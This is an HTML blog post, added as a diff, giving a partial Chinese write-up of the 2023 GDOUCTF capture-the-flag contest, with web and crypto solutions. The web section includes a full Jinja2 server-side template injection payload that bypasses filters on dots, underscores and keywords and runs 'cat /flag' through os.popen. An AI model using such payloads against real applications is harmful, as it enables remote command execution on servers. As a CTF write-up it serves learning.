@@ -1,0 +1,402 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>2023 GDOUCTF 部分wp | Arcueid&#39;s BLOG</title>
+    <meta name="author" content="Arcueid" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/Arcueid.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ARCUEID&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ARCUEID&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>2023 GDOUCTF 部分wp</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/4/16
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="hate-eat-snake"><a href="#hate-eat-snake" class="headerlink" title="hate eat snake"></a>hate eat snake</h2><p>js改个高分然后去送<img src="https://img-blog.csdnimg.cn/4f549bced35444c2b171ef7068ca3c78.png" alt="在这里插入图片描述"></p>
+<h2 id="受不了一点"><a href="#受不了一点" class="headerlink" title="受不了一点"></a>受不了一点</h2><p>如图<br><img src="https://img-blog.csdnimg.cn/5bdcf86c3ab2457aa2ce4a2709a071a7.png" alt="在这里插入图片描述"></p>
+<h2 id="EZ-WEB"><a href="#EZ-WEB" class="headerlink" title="EZ WEB"></a>EZ WEB</h2><p>看源码然后发put包<br><img src="https://img-blog.csdnimg.cn/a6ebfe910bf74701bfa85a18624d983a.png" alt="在这里插入图片描述"></p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><ez_ze></h2><p>过滤挺多的 . _ 然后各种关键字<br>点用|attr()绕   下划线用拼接<br><img src="https://img-blog.csdnimg.cn/7175d0010532459e89192baf12aa5cec.png" alt="在这里插入图片描述"><br>payload如下<br><code>name=&#123;% set po=dict(po=a,p=a)|join%&#125;&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;&#123;% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%&#125;&#123;% set bs=(a,a,dict(bas=a,e=b)|join(),a,a)|join()%&#125;&#123;% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%&#125;&#123;% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%&#125;&#123;%set pp=dict(pop=a,en=b)|join %&#125;&#123;%set r=self|string|attr(geti)(18)%&#125;&#123;%set rd=dict(read=a)|join%&#125;&#123;%print(()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(132)|attr(ini)|attr(glo)|attr(geti)(pp)('cat /flag')|attr('read')() )%&#125;</code></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Absolute-Baby-Encrytpion"><a href="#Absolute-Baby-Encrytpion" class="headerlink" title="Absolute_Baby_Encrytpion"></a>Absolute_Baby_Encrytpion</h2><pre><code class="python">cipher = &#39;+&#125;!q&quot;)hiim)#&#125;-nvm)i-$#mvn#0mnbm)im#n+&#125;!qnm8)i-$#mvnoc#0nz&lt;$9inm!&gt;-n1:1-nm8)i-$~c58n!&#125;qhij#0[noic##m8nc8n?!8c&#125;w!n]&gt;&amp;&#39;
+encryptedString = &quot;&quot;
+decryptedString = &#39;&#39;
+for char in cipher:
+    if char == &#39;!&#39;:
+        decryptedString += &#39;a&#39;
+    elif char == &#39;1&#39;:
+        decryptedString += &#39;b&#39;
+    elif char == &#39;)&#39;:
+        decryptedString += &#39;c&#39;
+    elif char == &#39;v&#39;:
+        decryptedString += &#39;d&#39;
+    elif char == &#39;m&#39;:
+        decryptedString += &#39;e&#39;
+    elif char == &#39;+&#39;:
+        decryptedString += &#39;f&#39;
+    elif char == &#39;q&#39;:
+        decryptedString += &#39;g&#39;
+    elif char == &#39;0&#39;:
+        decryptedString += &#39;h&#39;
+    elif char == &#39;c&#39;:
+        decryptedString += &#39;i&#39;
+    elif char == &#39;]&#39;:
+        decryptedString += &#39;j&#39;
+    elif char == &#39;(&#39;:
+        decryptedString += &#39;k&#39;
+    elif char == &#39;&#125;&#39;:
+        decryptedString += &#39;l&#39;
+    elif char == &#39;[&#39;:
+        decryptedString += &#39;m&#39;
+    elif char == &#39;8&#39;:
+        decryptedString += &#39;n&#39;
+    elif char == &#39;5&#39;:
+        decryptedString += &#39;o&#39;
+    elif char == &#39;$&#39;:
+        decryptedString += &#39;p&#39;
+    elif char == &#39;*&#39;:
+        decryptedString += &#39;q&#39;
+    elif char == &#39;i&#39;:
+        decryptedString += &#39;r&#39;
+    elif char == &#39;&gt;&#39;:
+        decryptedString += &#39;s&#39;
+    elif char == &#39;#&#39;:
+        decryptedString += &#39;t&#39;
+    elif char == &#39;&lt;&#39;:
+        decryptedString += &#39;u&#39;
+    elif char == &#39;?&#39;:
+        decryptedString += &#39;v&#39;
+    elif char == &#39;o&#39;:
+        decryptedString += &#39;w&#39;
+    elif char == &#39;^&#39;:
+        decryptedString += &#39;x&#39;
+    elif char == &#39;-&#39;:
+        decryptedString += &#39;y&#39;
+    elif char == &#39;_&#39;:
+        decryptedString += &#39;z&#39;
+    elif char == &#39;h&#39;:
+        decryptedString += &#39;0&#39;
+    elif char == &#39;w&#39;:
+        decryptedString += &#39;1&#39;
+    elif char == &#39;e&#39;:
+        decryptedString += &#39;2&#39;
+    elif char == &#39;9&#39;:
+        decryptedString += &#39;3&#39;
+    elif char == &#39;g&#39;:
+        decryptedString += &#39;4&#39;
+    elif char == &#39;z&#39;:
+        decryptedString += &#39;5&#39;
+    elif char == &#39;d&#39;:
+        decryptedString += &#39;6&#39;
+    elif char == &#39;~&#39;:
+        decryptedString += &#39;7&#39;
+    elif char == &#39;=&#39;:
+        decryptedString += &#39;8&#39;
+    elif char == &#39;x&#39;:
+        decryptedString += &#39;9&#39;
+    elif char == &#39;j&#39;:
+        decryptedString += &#39;!&#39;
+    elif char == &#39;:&#39;:
+        decryptedString += &#39;@&#39;
+    elif char == &#39;4&#39;:
+        decryptedString += &#39;#&#39;
+    elif char == &#39;b&#39;:
+        decryptedString += &#39;$&#39;
+    elif char == &#39;`&#39;:
+        decryptedString += &#39;%&#39;
+    elif char == &#39;l&#39;:
+        decryptedString += &#39;^&#39;
+    elif char == &#39;3&#39;:
+        decryptedString += &#39;&amp;&#39;
+    elif char == &#39;t&#39;:
+        decryptedString += &#39;*&#39;
+    elif char == &#39;6&#39;:
+        decryptedString += &#39;(&#39;
+    elif char == &#39;s&#39;:
+        decryptedString += &#39;)&#39;
+    elif char == &#39;n&#39;:
+        decryptedString += &#39;_&#39;
+    elif char == &#39;;&#39;:
+        decryptedString += &#39;+&#39;
+    elif char == &#39;\&#39;&#39;:
+        decryptedString += &#39;-&#39;
+    elif char == &#39;r&#39;:
+        decryptedString += &#39;=&#39;
+    elif char == &#39;k&#39;:
+        decryptedString += &#39;`&#39;
+    elif char == &#39;p&#39;:
+        decryptedString += &#39;~&#39;
+    elif char == &#39;\&quot;&#39;:
+        decryptedString += &#39;&#123;&#39;
+    elif char == &#39;&amp;&#39;:
+        decryptedString += &#39;&#125;&#39;
+    elif char == &#39;/&#39;:
+        decryptedString += &#39;[&#39;
+    elif char == &#39;\\&#39;:
+        decryptedString += &#39;]&#39;
+    elif char == &#39;2&#39;:
+        decryptedString +=  &#39;|&#39;
+    elif char == &#39;.&#39;:
+        decryptedString += &#39;:&#39;
+    elif char == &#39;%&#39;:
+        decryptedString += &#39;;&#39;
+    elif char == &#39;|&#39;:
+        decryptedString += &#39;&quot;&#39;
+    elif char == &#39;,&#39;:
+        decryptedString += &quot;&#39;&quot;
+    elif char == &#39;@&#39;:
+        decryptedString += &#39;&lt;&#39;
+    elif char == &#39;&#123;&#39;:
+        decryptedString += &#39;&gt;&#39;
+    elif char == &#39;u&#39;:
+        decryptedString += &#39;,&#39;
+    elif char == &#39;7&#39;:
+        decryptedString += &#39;.&#39;
+    elif char == &#39;y&#39;:
+        decryptedString += &#39;?&#39;
+    elif char == &#39;a&#39;:
+        decryptedString += &#39;/&#39;
+
+    print(decryptedString)
+</code></pre>
+<h2 id="babylua"><a href="#babylua" class="headerlink" title="babylua"></a>babylua</h2><p>先爆破得到key<br>有key就可以直接解密了</p>
+<pre><code class="python">import hashlib
+import string
+cipher = [&#39;200&#39;, &#39;161&#39;, &#39;198&#39;, &#39;157&#39;, &#39;173&#39;, &#39;169&#39;, &#39;199&#39;, &#39;150&#39;, &#39;105&#39;, &#39;163&#39;, &#39;193&#39;, &#39;175&#39;, &#39;173&#39;, &#39;194&#39;, &#39;135&#39;, &#39;131&#39;, &#39;135&#39;, &#39;225&#39;]
+flag = &#39;&#39;
+
+# key10 = &#39;b5e62abe84&#39;
+# string = string.ascii_letters
+# for i in string:
+#     for j in string:
+#         for k in string:
+#             for l in string:
+#                 seed = i+j+k+l
+#                 key = hashlib.md5(seed.encode()).hexdigest()
+#                 key = hashlib.md5(key.encode()).hexdigest()
+#                 if(key[:10] == key10):
+#                     print(key)
+
+# b5e62abe84bc8afbfd97c91a15aa0867
+
+key = &#39;b5e62abe84bc8afbfd97c91a15aa0867&#39;
+for i in range(len(cipher)):
+    flag += chr(int(cipher[i])-ord(key[i])) 
+print(flag)
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Arcueid&#39;s BLOG
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Arcueid
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
